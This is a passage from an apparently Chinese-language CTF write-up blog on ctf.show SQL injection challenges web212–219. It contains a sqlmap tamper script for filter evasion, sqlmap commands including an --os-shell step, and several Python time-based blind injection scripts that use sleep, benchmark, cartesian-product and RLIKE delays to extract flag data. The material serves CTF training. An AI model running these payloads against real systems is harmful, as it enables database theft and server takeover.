class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)</span><br><span class="line">See the file &#x27;LICENSE&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from lib.core.compat import xrange</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">import base64</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span><br><span class="line">    Tested against:</span><br><span class="line">        * Microsoft SQL Server 2005</span><br><span class="line">        * MySQL 4, 5.0 and 5.5</span><br><span class="line">        * Oracle 10g</span><br><span class="line">        * PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line">    Notes:</span><br><span class="line">        * Useful to bypass weak and bespoke web application firewalls</span><br><span class="line">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span><br><span class="line">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    retVal = payload</span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += chr(0x0a)</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;\&#x27;&#x27;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &#x27;&quot;&#x27;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line">            </span><br><span class="line">            elif payload[i] == &#x27;*&#x27;:</span><br><span class="line">                retVal += chr(0x0a)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += chr(0x0a)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal=retVal.encode()</span><br><span class="line">        retVal=retVal[::-1]</span><br><span class="line">        retVal=base64.b64encode(retVal)</span><br><span class="line">        retVal=retVal[::-1]</span><br><span class="line">        retVal=base64.b64encode(retVal)</span><br><span class="line">    return retVal.decode()</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u http://afdc1158-aee3-4928-857b-b78e71ff6d88.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --data=&quot;id=1&quot; --user-agent=sqlmap --referer=&quot;http://afdc1158-aee3-4928-857b-b78e71ff6d88.challenge.ctf.show/sqlmap.php&quot; --cookie=&quot;PHPSESSID=urnvf6582lubt0pjrr5sk518q2;&quot; --header=&quot;Content-Type:text/plain&quot; --safe-url=https://afdc1158-aee3-4928-857b-b78e71ff6d88.challenge.ctf.show/api/getToken.php --safe-freq=1 --tamper=web212.py --batch -D ctfshow_web -T ctfshow_flavis --dump</span><br></pre></td></tr></table></figure>

<h3 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h3><p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117225756063-1747825292263-51.png" alt="image-20250117225756063"></p>
<p>考的是用–os-shell参数去getshell</p>
<p>os-shell的使用条件<br>（1）网站必须是root权限<br>（2）攻击者需要知道网站的绝对路径<br>（3）GPC为off，php主动转义的功能关闭</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">python3 sqlmap.py -u &quot;https://a58afa16-b03f-4cca-869b-640aca35b94d.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;https://a58afa16-b03f-4cca-869b-640aca35b94d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=PUT --data &quot;id=1&quot; --header=Content-Type:text/plain --user-agent=sqlmap --cookie=&quot;PHPSESSID=u1193e84h0fp64kqv00rd6ubt5&quot; --tamper=web212.py --referer=ctf.show --os-shell</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250117230455364-1747825292263-53.png" alt="image-20250117230455364"></p>
<p>选择服务器类型</p>
<ol>
<li><strong>ASP (Active Server Pages)</strong>: 一种由微软开发的服务器端脚本技术，允许开发者在网页中嵌入 VBScript 或 JScript 代码。</li>
<li><strong>ASPX</strong>: 是 <a target="_blank" rel="noopener" href="http://asp.net/">ASP.NET</a> 的页面文件扩展名，<a target="_blank" rel="noopener" href="http://asp.net/">ASP.NET</a> 是微软的一个Web开发框架，支持多种编程语言（如 C# 和 <a target="_blank" rel="noopener" href="http://vb.net/">VB.NET</a>），用于创建动态网页和Web应用程序。</li>
<li><strong>JSP (JavaServer Pages)</strong>: 一个由 Java 提供支持的技术，允许在 HTML 页面中嵌入 Java 代码，以生成动态内容。</li>
<li><strong>PHP</strong>: 一种广泛使用的开源脚本语言，主要用于Web开发，允许开发者将代码嵌入到HTML中。它是您提到的默认语言。</li>
</ol>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h3><p>没找到参数，我记得之前有一个工具是可以探测参数的</p>
<p>Arjun</p>
<p>也可以在index下的select.js中看到参数</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504175219845.png" alt="image-20250504175219845"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1&amp;debug=1</span><br></pre></td></tr></table></figure>

<p>这里debug得设为1才能出现回显</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250504175356220.png" alt="image-20250504175356220"></p>
<p>ip是查询语句中的参数，看一下延迟时间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1 or sleep(2)#&amp;debug=1</span><br></pre></td></tr></table></figure>

<p>大概两秒左右，那其实是差不多，写脚本吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://03356e28-c215-4129-97db-2f9864c35ca2.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail :</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),0)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1)#&quot;.format(i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select flaga from ctfshow_flagx),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1)#&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span> : <span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        request_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request_time &gt; <span class="number">3</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span> :</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h3><p>这次是字符型，用了单引号，去闭合就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1&#x27; or sleep(2)#&amp;debug=1</span><br></pre></td></tr></table></figure>

<p>然后写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9a7beb5f-6196-4c37-ae56-b0bf74a95924.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;&#x27; or if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;&#x27; or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;&#x27; or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; or if(ascii(substr((select flagaa from ctfshow_flagxc),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),0)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span> : <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        end_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end_time &gt; <span class="number">2.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from ctfshow_info where ip = from_base64(1);</span><br></pre></td></tr></table></figure>

<p>还是一样，闭合就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1) or sleep(3)#&amp;debug=1</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c3d07a22-e8ee-4b69-9fe0-2b5900d6720e.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; or if(ascii(substr((select flagaac from ctfshow_flagxcc),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),0)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span> : <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        end_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end_time &gt; <span class="number">2.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h3><p>过滤了sleep函数，可以用benchmark函数去绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c9b5a9bb-df7d-4de0-9eed-7f5dff7b66d0.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,benchmark(1000000,md5(&#x27;1&#x27;)),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,benchmark(10000000, MD5(&#x27;test&#x27;)),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,benchmark(10000000, MD5(&#x27;test&#x27;)),0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1）or if(ascii(substr((select flagaabc from ctfshow_flagxccb),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,benchmark(100000000, MD5(&#x27;test&#x27;)),0)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span> : <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        end_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end_time &gt; <span class="number">2.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>不得不说这个时间确实不太稳定，后面爆数据的时候把benchmark的次数改了很多次</p>
<h3 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h3><p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505120400822.png" alt="image-20250505120400822"></p>
<p>查询语句变了，参数是id，这次sleep和benchmark函数都被禁用了，但是这里的话输入点还是和之前是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from ctfshow_info where ip = (1);</span><br></pre></td></tr></table></figure>

<p>这里的话可以用笛卡尔积去做</p>
<p><img src="/../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20250505123048957.png" alt="image-20250505123048957"></p>
<p>那就测一下延迟吧</p>
<p>不得不说这个测的真挺麻烦的，每次要么太少要么太多</p>
<p>如果是用columns的话两个太少三个太多，最后还是决定用三个tables的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1) or if(ascii(substr(database(),1,1))&gt;0,(select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C),0)%23&amp;debug=1</span><br></pre></td></tr></table></figure>

<p>那就写脚本吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e37fb63a-1945-44db-9885-cfa468e30d51.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C),0)#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,(select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C),0)#&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1) or if(ascii(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,(select count(*) from information_schema.tables A, information_schema.tables B,information_schema.tables C),0)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span> : <span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        end = time.time() - start</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="number">1</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>回来做一下rlike的做法，常规测延迟</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1) or if(ascii(substr(database(),1,1))&gt;0,(select concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,7),&#x27;b&#x27;)),0)#&amp;debug=1</span><br></pre></td></tr></table></figure>

<p>测了大半天才测出来，延迟大概4s左右，照着改脚本就行</p>
<h3 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h3><p>才发现上把预期是用rlike去打盲注的，那又得返回去做一下，既然这样的话那这道题就是用笛卡尔积去做的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=1)+or+if(ascii(substr(database()%2c1%2c1))%3e0%2c(SELECT+count(*)+FROM+information_schema.tables+A%2c+information_schema.tables+B%2c+information_schema.schemata+D%2c+information_schema.schemata+E%2c+information_schema.schemata+F%2cinformation_schema.schemata+G)%2c0)%23&amp;debug=1</span><br></pre></td></tr></table></figure>

<p>这里的话刚好延迟是3-4s左右</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span 